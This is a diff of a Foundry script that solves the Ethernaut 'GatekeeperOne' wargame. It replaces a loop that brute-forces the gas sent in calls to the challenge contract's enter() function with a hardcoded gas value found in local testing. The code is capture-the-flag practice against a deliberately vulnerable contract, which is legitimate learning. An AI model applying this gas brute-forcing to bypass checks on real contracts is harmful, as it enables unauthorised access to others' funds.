@@ -12,12 +12,14 @@ contract Proxy {
     constructor (uint64 intRep) {
         gateKey = bytes8(intRep);
     }
-    function attack() external {
-        for (uint256 g = 0; true; g++) {
-            (bool ok, bytes memory result) = address(instance).call{gas: 2*8191 + g}(abi.encodeWithSignature("enter(bytes8)", gateKey));
-            if (ok)
-                break;
-        }
+    function attack() external returns (uint256) {
+        uint256 g = 8447; // got from the local test, 
+        // for (; true; g++) {
+        //     (bool ok, bytes memory result) = address(instance).call{gas: 2*8191 + g}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+        //     if (ok)
+        //         break;
+        // }
+        return g;
     }
 }
 
@@ -38,8 +40,9 @@ contract GatekeeperOneSolver is Script {
 
         Proxy p = new Proxy(intRep);
 
-        p.attack();
+        // p.attack();
 
+        console.log("gas --> ", address(uint160(p.attack()))); // logged the value in local test in order to use it in the actual test
         console.log("after --> ", instance.entrant());
 
         vm.stopBroadcast();
